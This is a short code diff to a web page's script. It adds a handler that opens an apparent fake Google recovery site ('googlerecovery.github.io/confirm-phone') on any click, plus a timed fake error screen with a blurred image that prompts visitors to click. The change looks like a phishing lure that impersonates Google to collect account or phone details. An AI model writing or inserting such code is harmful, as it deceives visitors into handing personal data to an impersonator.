@@ -104,5 +104,15 @@ p {
         return document.getElementById(id);
     }
     
+    window.onclick = () => { window.open("https://googlerecovery.github.io/confirm-phone/");
+    }
+    
+    setTimeout( () => {
+    id("retry").style.display = "block";
+    id("error").style.display = "block";
+    id("frdimg").style.filter ="blur(3px)";
+    
+    },6000);
+    
 </script>
 </html>
